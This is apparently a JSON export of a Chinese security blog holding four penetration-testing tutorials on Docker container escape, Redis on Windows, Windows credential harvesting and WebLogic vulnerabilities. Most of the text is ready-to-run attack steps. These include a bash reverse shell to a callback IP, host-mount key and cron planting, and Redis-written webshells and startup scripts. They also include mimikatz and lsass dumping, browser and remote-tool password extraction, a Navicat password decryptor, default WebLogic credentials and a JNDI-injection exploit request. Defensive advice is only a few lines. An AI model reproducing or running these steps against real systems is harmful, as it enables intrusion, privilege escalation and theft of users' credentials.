{"meta":{"title":"The Blog Of K3vi","subtitle":"给岁月以文明，而不是给文明以岁月","description":"","author":"k3vi","url":"https://k3vi-07.github.io","root":"/"},"pages":[{"title":"404","date":"2021-01-04T06:04:27.000Z","updated":"2021-01-04T06:04:54.006Z","comments":true,"path":"404/index.html","permalink":"https://k3vi-07.github.io/404/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-12-26T07:06:08.000Z","updated":"2020-12-26T07:06:37.672Z","comments":true,"path":"categories/index.html","permalink":"https://k3vi-07.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-12-26T07:07:18.000Z","updated":"2020-12-26T07:07:44.116Z","comments":true,"path":"about/index.html","permalink":"https://k3vi-07.github.io/about/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-12-30T07:29:09.000Z","updated":"2020-12-31T09:52:10.602Z","comments":true,"path":"friends/index.html","permalink":"https://k3vi-07.github.io/friends/index.html","excerpt":"","text":""},{"title":"contact","date":"2020-12-26T07:07:52.000Z","updated":"2020-12-26T07:08:45.272Z","comments":true,"path":"contact/index.html","permalink":"https://k3vi-07.github.io/contact/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-12-26T07:06:42.000Z","updated":"2020-12-26T07:07:12.648Z","comments":true,"path":"tags/index.html","permalink":"https://k3vi-07.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"docker攻防总结","slug":"docker攻防总结","date":"2021-08-25T08:13:41.000Z","updated":"2023-01-10T07:57:40.656Z","comments":true,"path":"2021/08/25/docker攻防总结/","link":"","permalink":"https://k3vi-07.github.io/2021/08/25/docker%E6%94%BB%E9%98%B2%E6%80%BB%E7%BB%93/","excerpt":"一、序言在生活中Docker用的越来越多，平时也很喜欢用docker，相信在以后的实战中也会遇到很多，所以这周就写一写关于Docker的相关漏洞。 二、漏洞相关2.1、CVE-2019-5736(Docker逃逸漏洞)2.1.1、漏洞介绍漏洞点在于RunC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，RunC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。 在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。","text":"一、序言在生活中Docker用的越来越多，平时也很喜欢用docker，相信在以后的实战中也会遇到很多，所以这周就写一写关于Docker的相关漏洞。 二、漏洞相关2.1、CVE-2019-5736(Docker逃逸漏洞)2.1.1、漏洞介绍漏洞点在于RunC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，RunC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。 在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。 2.1.2、影响版本docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6 2.1.3、利用过程exp https://github.com/Frichetten/CVE-2019-5736-PoC 修改其中的payload payload=\"#!/bin/bash \\n bash -i &gt;&amp; /dev/tcp/100.64.65.210/999 0&gt;&amp; 1\" 然后进行编译生成main CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 我的docker版本 复制生成的main到docker中运行，当受害者启动容器时 ，就会触发payload 2.2、Dockers emote api未授权访问2.2.1、漏洞介绍Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。 2.2.2、影响版本配置/lib/systemd/system/docker.service的ExecStart值 ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375 2.2.3、常用命令命令行 docker -H 100.64.65.71:2375 命令 #就后面跟命令就行 docker -H 100.64.65.71:2375 ps # 查看开启的容器 docker -H 100.64.65.71:2375 images #查看存在的镜像 http http://100.64.65.71:2375/version #显示版本信息 http://100.64.65.71:2375/containers/json #查看正在运行的容器 2.2.4、漏洞利用（1）、CVE-2019-5736当存在该漏洞时 docker -H 100.64.65.71:2375 images docker -H 100.64.65.71:2375 run -it -d damonevking/redis5.0 /bin/bash #启一个容器 docker -H 100.64.65.71:2375 ps #查看容器名 docker -H 100.64.65.71:2375 exec -it 271e91fb4e06 /bin/bash #进入容器内部 ./main #运行脚本 docker -H 100.64.65.71:2375 exec -it 271e91fb4e06 /bin/bash #再次进入 #获得权限 （2）、挂载目录可以挂在目录进行写密钥、定时任务之类的 docker -H 100.64.65.71:2375 run -it -v /:/mnt damonevking/redis5.0 /bin/bash #挂载目录 cd /mnt/home/lc/.ssh/ #我的公钥存放地址是/home/lc/.ssh cd /mnt/var/spool/cron/ #然后写就完事了 2.3、特权模式Docker逃逸2.3.1、漏洞介绍--privileged 可以启动docker的特权模式，这种模式允许我们以其宿主机具有（几乎）所有能力来运行容器，包括一些内核特性和设备访问。 2.3.2、影响版本docker version &lt;=18.09.2 2.3.3、漏洞利用 挂载目录 mount /dev/sda1 /mnt 然后写密钥、定时任务即可 cd /mnt/home/lc/.ssh/ cd /mnt/var/spool/cron/ 2.4、Docker逃逸–脏牛漏洞2.4.1、漏洞介绍Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。 docker与宿主机共享内核。可对脏牛漏洞发起攻击，令系统崩溃并获得root权限，且浏览容器之外主机上的文件。 2.4.2、影响版本Centos7/RHEL7 3.10.0-327.36.3.el7 Cetnos6/RHEL6 2.6.32-642.6.2.el6 Ubuntu16.10 4.8.0-26.28 Ubuntu16.04 4.4.0-45.66 Ubuntu14.04 3.13.0-100.147 Debian8 3.16.36-1+deb8u2 Debian7 3.2.82-1 2.4.3、漏洞利用该POC执行后，它就会给你一个root权限的shell https://github.com/scumjr/dirtycow-vdso cd /dirtycow-vdso/ make ./0xdeadbeef 100.64.65.71:10001 2.5、docker.sock挂在到容器内部2.5.1、漏洞介绍docker.sock文件挂载到容器中，通过操作可进行一些漏洞 2.5.2、漏洞利用docker.sock挂在容器内部 docker run -it -d -v /var/run/docker.sock:/var/run/docker.sock docker docker -H unix:///var/run/docker.sock info #查看docker信息 docker -H unix:///var/run/docker.sock ps #查看正在运行的容器 新开个容器挂载目录 docker -H unix:///var/run/docker.sock run -it -v /:/mnt damonevking/redis5.0 /bin/bash cd /mnt/home/lc/.ssh/ #我的公钥存放地址是/home/lc/.ssh cd /mnt/var/spool/cron/ #定时任务 写就完事了 2.6、CVE-2019-14271（Docker cp漏洞）说实话这一个漏洞我没怎么看懂怎么利用，大家可以这个帖子。 https://xz.aliyun.com/t/6806 四、防止docker逃逸的方法1、及时更新docker版本。 2、runc版本&gt;1.0-rc6。 3、Linux内核版本及时更新。 4、不要用root权限启动Docker。 5、不要使用特权模式、目录挂载、开放Docker Remote API 接口等 五、总结总算写好了，第一个漏洞花了好长时间最终还是没搞成功，，经过0x584A大佬提醒，原来要/bin/sh进入才能得到shell，万分感谢，困扰了好多天。 后续有新的漏洞会更新的。 文章中有什么问题或者其他，请在评论区艾特我，谢谢。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://k3vi-07.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"docker","slug":"docker","permalink":"https://k3vi-07.github.io/tags/docker/"},{"name":"攻防","slug":"攻防","permalink":"https://k3vi-07.github.io/tags/%E6%94%BB%E9%98%B2/"}],"author":"诚默"},{"title":"redis漏洞利用-window","slug":"redis漏洞利用-window","date":"2021-08-25T08:12:08.000Z","updated":"2023-01-10T07:58:06.343Z","comments":true,"path":"2021/08/25/redis漏洞利用-window/","link":"","permalink":"https://k3vi-07.github.io/2021/08/25/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-window/","excerpt":"一、前言之前写了篇redis攻防总结，因为现实中windows上redis的没怎么遇到，加上也没去了解，所以也就没写上。但是评论中都希望我加上。由于图片上传+排版等问题，还是新开一篇关于reids在windws上的利用。 二、Windows下redis利用环境：win10（x64）上以管理员权限启动的redis3 2.1、未授权访问2.1.1、写webshell已知站点绝对路径（C:\\phpStudy\\PHPTutorial\\WWW\\pikachu123），写webshell","text":"一、前言之前写了篇redis攻防总结，因为现实中windows上redis的没怎么遇到，加上也没去了解，所以也就没写上。但是评论中都希望我加上。由于图片上传+排版等问题，还是新开一篇关于reids在windws上的利用。 二、Windows下redis利用环境：win10（x64）上以管理员权限启动的redis3 2.1、未授权访问2.1.1、写webshell已知站点绝对路径（C:\\phpStudy\\PHPTutorial\\WWW\\pikachu123），写webshell config set dir C:\\phpStudy\\PHPTutorial\\WWW\\pikachu123 set x \"\\n\\n\\n&lt;?php phpinfo();?&gt;\\n\\n\\n\" config set dbfilename phpinfo.php save 可以看到成功写入 2.2.2、写启动项已知我的启动项位置 C:\\Users\\lc\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 一般是 C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 写个弹窗，双引号记得转义，要使用两个\\r\\n才能成功执行。 config set dir \"C:/Users/lc/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/\" set x \"\\r\\n\\r\\nmshta vbscript:msgbox(\\\"hack\\\",64,\\\"Title\\\")(window.close)\\r\\n\\r\\n\" config set dbfilename hack.bat save 保存成功，且能正常运行 2.2、主从复制写无损文件2.2.1、攻击原理Redis是一个使用ANSIC编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。 但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 攻击者（主机）写一个so文件，然后通过 FULLRESYNC（全局）同步文件到受害人（从机）上。 2.2.2、利用方式此脚本是通过 Redis 主从写出无损文件，可用于 Windows 平台下写出无损的 EXE、DLL、 LNK 和 Linux 下的 OS 等二进制文件。在我们的服务器中运行该脚本（目标Redis一定要能回连我们的服务器才行）。 https://github.com/r35tart/RedisWriteFile Options: -h, --help 帮助信息 --rhost=REMOTE_HOST 目标主机 --rport=REMOTE_PORT 目标redis端口, default 6379 --lhost=LOCAL_HOST 回连ip --lport=LOCAL_PORT 回连端口, default 21000 --rpath=Target_File_Path 写入路径, default '.' --rfile=Target_File_Name 写入文件名, default dump.rdb --lfile=Local_File_Name 写入本地那个文件内容 --auth=AUTH reids认证密码 -v, --verbose 显示数据流 样例 python3 rediswritefile.py --rhost=目标ip --rport=目标端口 --lhost=攻击机ip --lport=攻击机监听端口 --rpath=写入路径 --rfile=写入的文件名 --lfile=写入本机哪个文件的内容 将本地的txt文件写入到windows python3 RedisWriteFile.py --rhost=100.64.65.226 --rport=6379 --lhost=100.64.65.210 --lport=6888 --rpath=\"C:\\123\" --rfile=123.txt --lfile=/home/lc/123.txt 成功写入 三、总结防御方法可设置redis密码为高强度密码，以低权限启动。 由于时间有限，上面只简单写了些写入文件的方法。也就是也希望各位大佬在评论区留下更新奇的相关技巧，有空的话我看着再加一加。文章中如有问题，请邮件联系我。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://k3vi-07.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"攻防","slug":"攻防","permalink":"https://k3vi-07.github.io/tags/%E6%94%BB%E9%98%B2/"},{"name":"redis","slug":"redis","permalink":"https://k3vi-07.github.io/tags/redis/"}],"author":"诚默"},{"title":"内网信息收集之-windows","slug":"内网信息收集之-windows","date":"2021-08-10T02:18:38.000Z","updated":"2023-01-10T07:56:44.607Z","comments":true,"path":"2021/08/10/内网信息收集之-windows/","link":"","permalink":"https://k3vi-07.github.io/2021/08/10/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B-windows/","excerpt":"一、序言在日常渗透常常会碰到windows，在获取了一台windows主机后，我们要进行信息收集，获取在内网中的其他主机资产信息，以及相关账号密码等进行后续的渗透。 这边假设控制了一台windows主机，那我们如何对这一台主机进行尽量全的信息收集。 二、收集内容2.1、系统网络相关信息通过systeminfo来打印系统信息，可以看到包含系统信息、系统补丁、域、网卡信息等。","text":"一、序言在日常渗透常常会碰到windows，在获取了一台windows主机后，我们要进行信息收集，获取在内网中的其他主机资产信息，以及相关账号密码等进行后续的渗透。 这边假设控制了一台windows主机，那我们如何对这一台主机进行尽量全的信息收集。 二、收集内容2.1、系统网络相关信息通过systeminfo来打印系统信息，可以看到包含系统信息、系统补丁、域、网卡信息等。 2.2、系统账号密码与登录凭据2.2.1、抓取本地windows账号密码（1）、直接上传mimikatz读取账号密码 privilege::debug sekurlsa::logonpasswords mimikatz.exe \"sekurlsa::debug\" \"sekurlsa::logonPasswords\" (2)导出lsass进程的内存文件 可能有waf上传不上去，通过procdump来导出lsass进程的内存文件。 procdump64.exe -accepteula -ma lsass.exe lsass.dmp #导出为lsass.dump文件 mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswordsfull\" exit (3)注册表导出 reg save HKLM\\SYSTEM system.hiv reg save HKLM\\SAM sam.hiv reg save hklm\\security security.hiv mimikatz.exe \"lsadump::sam /system:system.hiv /sam:sam.hiv\" exit 或使用https://github.com/SecureAuthCorp/impacket python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL 2.2.2、抓取其他的登录凭据#查看mstsc的连接纪录 cmdkey /list #查找本地的Credentials： dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* 存在很多登录凭据 #查找本地的Credentials： 选其中一个来提取 管理员权限运行mimikatz.exe \"privilege::debug\" dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\BF79E68DD4C78FB8BE8B2C6D69CFBEA7 执行找到guidMasterKey值对应的guid下的MasterKer值 mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" &gt;1.txt 得到MasterKey mimikatz.exe \"dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\BF79E68DD4C78FB8BE8B2C6D69CFBEA7 /masterkey:2a1761e64cf86ad5447ffa4ae7ea4f19f9c9c4acd56a9cf815f9d5a0be6dc5cc5aa044f47f704cdca9082661dba3f74f3a5fc77cc67957abbf1a2e944e3d656b\" 成功得到我的gitee的账号密码 2.3.3、wifi密码用的比较少，但还是提一下 批量显示wifi账号密码 for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 2.3、浏览器账号密码2.3.1、浏览器各类文件地址（1）、google书签：C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks Cookie: C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies 浏览历史：C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History 当前的session：C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Current Session 账号密码：C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data （2）、QQ浏览器⽤户数据⽬录：C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default 缓存⽬录：C:\\Users\\xx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\ 各⽂件如下： 书签：C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\Bookmarks Cookie: C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\Cookies 浏览历史：C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\History 当前的session：C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\Current Session 账号密码：C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\Login Data 或 C:\\Users\\xx\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\xxxxxxxxxxx\\6 （3）、360浏览器账号密码⽂件：C:\\Users\\xx\\AppData\\Roaming\\360se6\\User Data\\Default\\apps\\LoginAssis\\assis2.db （4）、Firefox账号密码⽂件： C:\\Users\\xx\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\7s5izkwl.defaultrelease\\logins.json （5）、IE/Edge书签⽂件：C:\\Users\\13910\\Favorites\\xx.url 2.3.2、浏览器账号密码提取https://github.com/moonD4rk/HackBrowserData windows/mac/linux都可以进行提取 .\\hack-browser-data.exe -h .\\hack-browser-data.exe -b all -f json --dir results -cc 运行后会生成 results/archive.zip 打开就有 存在cookie、password等 2.4、文件信息有部分运维就会将账号密码存放在桌面文件中，仔细查看文件，或许就会有意想不到的收获。 2.5、桌面软件保存信息简单列出以下几个 2.5.1、数据库连接工具Navicat通过文件-&gt;导出连接 打开导出的文件，复制其中Password的值 在线代码执行网站：https://tool.lu/coderunner/ （登陆后才能用） 修改代码最下面的版本号与密文，运行得到结果 &lt;?php class NavicatPassword { protected $version = 0; protected $aesKey = 'libcckeylibcckey'; protected $aesIv = 'libcciv libcciv '; protected $blowString = '3DC5CA39'; protected $blowKey = null; protected $blowIv = null; public function __construct($version = 12) { $this-&gt;version = $version; $this-&gt;blowKey = sha1('3DC5CA39', true); $this-&gt;blowIv = hex2bin('d9c7c3c8870d64bd'); } public function encrypt($string) { $result = FALSE; switch ($this-&gt;version) { case 11: $result = $this-&gt;encryptEleven($string); break; case 12: $result = $this-&gt;encryptTwelve($string); break; default: break; } return $result; } protected function encryptEleven($string) { $round = intval(floor(strlen($string) / 8)); $leftLength = strlen($string) % 8; $result = ''; $currentVector = $this-&gt;blowIv; for ($i = 0; $i &lt; $round; $i++) { $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector)); $currentVector = $this-&gt;xorBytes($currentVector, $temp); $result .= $temp; } if ($leftLength) { $currentVector = $this-&gt;encryptBlock($currentVector); $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector); } return strtoupper(bin2hex($result)); } protected function encryptBlock($block) { return openssl_encrypt($block, 'BF-ECB', $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); } protected function decryptBlock($block) { return openssl_decrypt($block, 'BF-ECB', $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); } protected function xorBytes($str1, $str2) { $result = ''; for ($i = 0; $i &lt; strlen($str1); $i++) { $result .= chr(ord($str1[$i]) ^ ord($str2[$i])); } return $result; } protected function encryptTwelve($string) { $result = openssl_encrypt($string, 'AES-128-CBC', $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv); return strtoupper(bin2hex($result)); } public function decrypt($string) { $result = FALSE; switch ($this-&gt;version) { case 11: $result = $this-&gt;decryptEleven($string); break; case 12: $result = $this-&gt;decryptTwelve($string); break; default: break; } return $result; } protected function decryptEleven($upperString) { $string = hex2bin(strtolower($upperString)); $round = intval(floor(strlen($string) / 8)); $leftLength = strlen($string) % 8; $result = ''; $currentVector = $this-&gt;blowIv; for ($i = 0; $i &lt; $round; $i++) { $encryptedBlock = substr($string, 8 * $i, 8); $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector); $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock); $result .= $temp; } if ($leftLength) { $currentVector = $this-&gt;encryptBlock($currentVector); $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector); } return $result; } protected function decryptTwelve($upperString) { $string = hex2bin(strtolower($upperString)); return openssl_decrypt($string, 'AES-128-CBC', $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv); } }; //需要指定版本两种，11或12 //$navicatPassword = new NavicatPassword(11); $navicatPassword = new NavicatPassword(11); //解密 //$decode = $navicatPassword-&gt;decrypt('15057D7BA390'); $decode = $navicatPassword-&gt;decrypt('E75BF077AB8BAA3AC2D5'); echo $decode.\"\\n\"; ?&gt; 2.5.2、Xshell存放地址 XShell5 %userprofile%\\Documents\\NetSarang\\Xshell\\Sessions XFtp5 %userprofile%\\Documents\\NetSarang\\Xftp\\Sessions XShell6 %userprofile%\\Documents\\NetSarang Computer\\6\\Xshell\\Sessions XFtp6 %userprofile%\\Documents\\NetSarang Computer\\6\\Xftp\\Sessions 文本中存放的Password就是加密后的密文 解密脚本： https://github.com/HyperSine/how-does-Xmanager-encrypt-password xshell解密： python3 XShellCryptoHelper.py -d -ver 6.0 lQilxEugvLFfghR5tNV3K9DKhmwArV+SbjWAcgZZzIDTnJ0JgCo= xftp解密： python3 XFtpCryptoHelper.py -d -ver 6.0 xxxx/xxxxx= 2.5.3、向日葵C:\\Program Files (x86)\\Oray\\SunLogin\\SunloginClient\\SunloginClient.exe 向日葵默认配置文件路径： 安装版：C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini 便携版(绿色版)：C:\\ProgramData\\Oray\\SunloginClient\\config.ini 读取配置文件[config.ini] [base]installautorun=nowindowuserpwd=0configpath=C:\\Program Files (x86)\\Oray\\SunLogin\\SunloginClient\\config.initracksvr=encrypwd=SxudeIOP2vs=macaddress=20:F1:7C:B2:F3:12hasuu=0showupdatetip=1hostname=defaulthostdesc=level=levelname=levelchanel=istransfer=ismessage=expires=skin=sunlogincode=isfastcodelogin=1logintype=0license=01ad-c92c-eec3-ee58licensepsw=fastcode=k107xxxxxxfastcodepsw=etXDq1sXsrFkESG0RNxxxxxxxxxsunloginserver=rc10-fc05.oray.com:443slapiserver=slapi.oray.netaccount=language=0firstrun=0lastview=1openeyes=1screenshots_path=C:\\Users\\Administrator\\Documents\\Sunlogin Files[common]serviceonly=0autorun=1 在ini中存在这两个关键字段 fastcode=xxxxxxxxxxfastcodepsw=xxxxxxxxxxxxxxxxxxxxxxx 其中 fastcode为本机识别码 encry_pwd为本机验证码但被加密 解密encry_pwd，便可得出向日葵远程连接密码 解密脚本 https://github.com/wafinfo/Sunflower_get_Password python3 SunDecrypt.py 输入密文即可 2.5.4、TeamViewer这个用T00ls上的getTVpass.exe即可，就不多说了 三、总结暂时想到的就这多了，各位大佬有什么新的想法欢迎提出。 如果本文章中存在什么问题，也敬请指正。关于文章中包含工具我已全部下载，若需要，可在公众号（诚默的每周学习总结）回复关键词：信息收集-windows，得到下载地址。 以上内容仅供学习交流","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://k3vi-07.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://k3vi-07.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"author":"诚默"},{"title":"weblogic漏洞总结","slug":"weblogic漏洞总结","date":"2021-08-02T02:13:02.000Z","updated":"2023-01-10T07:58:19.083Z","comments":true,"path":"2021/08/02/weblogic漏洞总结/","link":"","permalink":"https://k3vi-07.github.io/2021/08/02/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","excerpt":"一、Weblogic 介绍​ WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 二、漏洞相关2.1、已收集漏洞Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 Weblogic RCE CVE-2020-14882&amp;14883 weblogic jndi注入CVE-2020-14841 Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644) WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645 WebLogic CVE-2020-14756 T3IIOP反序列化RCE Weblogic 远程代码执行漏洞 CVE-2020-2883 Weblogic CVE-2020-2551 IIOP协议反序列化rce Weblogic反序列化漏洞 CVE-2019-2890 Weblogic反序列化远程代码执行漏洞CVE-2019-2725 Weblogic反序列化漏洞 CVE-2019-2729 Weblogic任意文件读取漏洞（CVE-2019-2615)） Weblogic 文件上传漏洞（CVE-2019-2618） weblogic 反序列化漏洞 CVE-2018-3252 Weblogic反序列化远程代码执行漏洞 CVE-2018-3245 Weblogic远程代码执行漏洞 CVE-2018-3191 Weblogic任意文件上传漏洞（CVE-2018-2894） Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893 Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271） Weblogic 反序列化漏洞 CVE-2017-3506 Weblogic 反序列化漏洞 CVE-2017-3248 Weblogic SSRF漏洞 CVE-2014-4210","text":"一、Weblogic 介绍​ WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 二、漏洞相关2.1、已收集漏洞Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 Weblogic RCE CVE-2020-14882&amp;14883 weblogic jndi注入CVE-2020-14841 Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644) WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645 WebLogic CVE-2020-14756 T3IIOP反序列化RCE Weblogic 远程代码执行漏洞 CVE-2020-2883 Weblogic CVE-2020-2551 IIOP协议反序列化rce Weblogic反序列化漏洞 CVE-2019-2890 Weblogic反序列化远程代码执行漏洞CVE-2019-2725 Weblogic反序列化漏洞 CVE-2019-2729 Weblogic任意文件读取漏洞（CVE-2019-2615)） Weblogic 文件上传漏洞（CVE-2019-2618） weblogic 反序列化漏洞 CVE-2018-3252 Weblogic反序列化远程代码执行漏洞 CVE-2018-3245 Weblogic远程代码执行漏洞 CVE-2018-3191 Weblogic任意文件上传漏洞（CVE-2018-2894） Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893 Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271） Weblogic 反序列化漏洞 CVE-2017-3506 Weblogic 反序列化漏洞 CVE-2017-3248 Weblogic SSRF漏洞 CVE-2014-4210 2.2、weblogic漏洞扫描工具https://github.com/0xn0ne/weblogicScanner 可以检测以下漏洞 weblogic administrator console、CVE-2014-4210、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2017-3506、CVE-2017-10271、CVE-2018-2628、CVE-2018-2893、CVE-2018-2894、CVE-2018-3191、CVE-2018-3245、CVE-2018-3252、CVE-2019-2618、CVE-2019-2725、CVE-2019-2729、CVE-2019-2890、CVE-2020-2551、CVE-2020-14882、CVE-2020-14883 2.3、常用弱口令weblogic Oracl@123 weblogic weblogic guest guest portaladmin portaladmin admin security joe password mary password system security wlcsystem wlcsystem wlcsystem sipisystem system password 2.4、通过任意文件读取来获取weblogic账号密码假设通过以下可读取文件 http://192.168.1.15:7001/hello/file.jsp?path=/etc/passwd weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件： 密文获取 config.xml是base_domain的全局配置文件，找到其中的的值，即为加密后的管理员密码 解密密文即可 解密工具 https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi 三、Weblogic-CVE漏洞按照年份分下类 3.1、2021年Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109 3.1.1、CVE-2021-2109（Weblogic LDAP 远程代码执行漏洞 ）（1）、介绍​ CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。 （2）、影响版本10.3.6.0.0 12.1.3.0.0 12.2.1.3.0 12.2.1.4.0 14.1.1.0.0 （3）、利用下载工具(用于 JNDI注入 利用)： https://github.com/feihong-cs/JNDIExploit/releases/tag/v.1.11 执行 java -jar JNDIExploit-v1.11.jar -i 192.168.204.131 exp执行ls命令 POST /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.204;131:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1 Host: 192.168.204.131:49163 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close cmd:ls Cookie: ADMINCONSOLESESSION=nM8lXW3nshhqyFuWs47qjIiQP0tUMtRYRHbBUFDXA8QIxRpdyNqr!964275826 Upgrade-Insecure-Requests: 1 3.2、2020年Weblogic RCE CVE-2020-14882&amp;14883 weblogic jndi注入CVE-2020-14841 Weblogic 